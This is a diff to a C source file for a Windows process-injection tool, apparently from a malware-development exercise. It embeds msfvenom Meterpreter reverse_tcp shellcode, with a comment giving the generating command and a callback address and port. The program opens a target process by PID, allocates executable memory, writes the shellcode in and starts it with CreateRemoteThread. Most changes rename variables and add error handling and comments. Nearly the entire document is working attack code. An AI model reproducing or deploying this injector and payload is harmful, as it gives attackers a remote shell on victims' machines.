@@ -6,7 +6,7 @@
 #define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 
 DWORD PID = 0;
-HANDLE HandleProcess, HandleThread = NULL;
+HANDLE ProcessHandle, ThreadHandle = NULL;
 LPVOID MemoryBuffer = NULL;
 
 // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.255.130 LPORT=1234 -f c
@@ -49,54 +49,59 @@ unsigned char shellcode[] =
     "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
     "\xf0\xb5\xa2\x56\xff\xd5";
 
-int shellcodesize = sizeof(shellcode);
+size_t shellcodesize = sizeof(shellcode);
 
 int main(int argc, char *argv[]) {
     if (argc < 2) {
-        warn("Usage program.exe <PID>");
+        info("Usage program.exe <PID>");
         return EXIT_FAILURE;
     }
 
     PID = atoi(argv[1]);
-    info("Trying to open handle to Process (%ld)", PID);
 
-    HandleProcess = OpenProcess(
+    // Obtain a Handle to the Process to gain necessary privileges to be able to manipulate the process
+    ProcessHandle = OpenProcess(
         PROCESS_ALL_ACCESS,
         FALSE,
         PID);
 
-    if (HandleProcess == NULL) {
-        warn("OpenProcess failed (PID: %ld) (Error: %ld)", PID, GetLastError());
+    if (ProcessHandle == NULL) {
+        warn("Failed to get a handle to the Process (Error Code: %ld)", GetLastError());
         return EXIT_FAILURE;
     }
 
-    okay("We got a handle to the process! 0x%p", HandleProcess);
+    okay("Successfully got a handle to the process %p", ProcessHandle);
 
+    // Allocate memory in the target process for the shellcode and set proper privileges for execution
     MemoryBuffer = VirtualAllocEx(
-        HandleProcess,
+        ProcessHandle,
         NULL,
         shellcodesize,
-        MEM_RESERVE | MEM_COMMIT,
-        PAGE_EXECUTE_READWRITE
-        );
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
 
     if (MemoryBuffer == NULL) {
-        warn("VirtualAllocEx failed (PID: %ld) (Error: %ld)", PID, GetLastError());
+        warn("Failed to allocate memory to the Process (Error code: %ld)", GetLastError());
+        return EXIT_FAILURE;
     }
 
-    info("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions\n", shellcodesize);
+    okay("Sucessfully wrote (%zu bytes) to the process", shellcodesize);
 
-    WriteProcessMemory(
-        HandleProcess,
+    // Write the shellcode in the allocated process memory
+    if (WriteProcessMemory(
+        ProcessHandle,
         MemoryBuffer,
         shellcode,
         shellcodesize,
-        NULL);
+        NULL) == 0)
+    {
+        warn("Failed to write to the process (Error code: %ld)", GetLastError());
+        return EXIT_FAILURE;
+    }
 
-    okay("Wrote %zu bytes to process memory\n", shellcodesize);
-
-    HandleThread = CreateRemoteThread(
-        HandleProcess,
+    // Create a new thread inside the process handle and run the injected shellcode
+    ThreadHandle = CreateRemoteThread(
+        ProcessHandle,
         NULL,
         0,
         (LPTHREAD_START_ROUTINE)MemoryBuffer,
@@ -104,19 +109,19 @@ int main(int argc, char *argv[]) {
         0,
         0);
 
-
-    if (HandleThread == NULL) {
-        warn("CreateRemoteThread failed (PID: %ld) (Error: %ld)", PID, GetLastError());
-        CloseHandle(HandleThread);
+    if (ThreadHandle == NULL) {
+        warn("Failed to create the process (Error code: %ld)", GetLastError());
+        CloseHandle(ProcessHandle);
         return EXIT_FAILURE;
     }
 
-    okay("We got a handle to the thread (%p)", HandleThread);
-    WaitForSingleObject(HandleThread, INFINITE);
+    // Wait for the thread to finish
+    WaitForSingleObject(ThreadHandle, INFINITE);
+    okay("Successfully got a handle to the thread (%p)", ThreadHandle);
 
-    info("Cleaning up..");
-    CloseHandle(HandleThread);
-    CloseHandle(HandleProcess);
+    info("Cleaning up...");
+    CloseHandle(ProcessHandle);
+    CloseHandle(ThreadHandle);
 
     return EXIT_SUCCESS;
 }
